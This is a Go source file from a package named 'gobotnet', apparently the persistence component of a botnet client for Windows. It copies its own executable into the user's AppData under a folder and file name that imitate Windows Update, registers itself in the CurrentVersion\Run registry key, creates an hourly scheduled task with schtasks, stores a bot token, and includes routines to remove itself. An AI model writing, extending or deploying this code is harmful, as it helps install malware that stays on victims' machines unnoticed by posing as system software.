package gobotnet

import (
	"errors"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"os"
)

var (
	programName        string = "winUpdate"
	copyProgramDir     string = os.Getenv("APPDATA") + `\WindowsUpdate`
	copyExecFilePath   string = copyProgramDir + `\` + programName + ".exe"
	tokenFile          string = copyProgramDir + `\` + programName + ".txt"
	sourceExecFilePath string = os.Args[0]
	token              string = "sfdsfdsfsdfsdgfdg4343643643"
)

func RegTest() {
	fmt.Println("REGISTRATION.GO TEST")
	os.MkdirAll(copyProgramDir, 0777)
	SaveTokenToFile(token)
	//OutMessage(err.Error())
}

func RegisterProgram() {
	os.Mkdir(copyProgramDir, 0777)
	err := CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
	OutMessage(err.Error())
	err = RegisterAutoRun()
	OutMessage(err.Error())
}

func UnRegisterProgram() {
	UnRegisterAutoRun()
	DeleteFile(sourceExecFilePath)
	DeleteFile(copyExecFilePath)
}

func RegisterAutoRun() error {
	err := WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName, copyExecFilePath)
	return err
}

func IsRegisterAutoRun() error {
	err := IsValueSetRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
	return err
}

func UnRegisterAutoRun() {
	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
}

func RegisterSchedule(nameTask string, pathToFile string) ([]byte, error) {
	return CmdExec("schtasks /create /f /tn " + nameTask + " /sc hourly /mo 1 /tr " + pathToFile)
}

func IsRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /query /tn " + nameTask + "\"")
}

func UnRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /delete /f /tn " + nameTask)
}

func SaveTokenToFile(token string) error {
	// file, err := os.Create(tokenFile)
	// if err != nil {
	// 	return err
	// }
	// defer file.Close()
	// return err

	err := ioutil.WriteFile(tokenFile, []byte(token), 0644)
	return err
}

func CheckFile(nameFile string) error {
	_, err := os.Stat(nameFile)
	if err != nil {
		if os.IsNotExist(err) {
			errors.New("File not exist.")
		}
		return err
	}
	return nil
}

// func ReadTokenFromFile() string {
// 	readBytes, err := ioutil.ReadFile(tokenFile)
// 	if err != nil {
// 		return ""
// 	}
// 	return string(readBytes)
// }
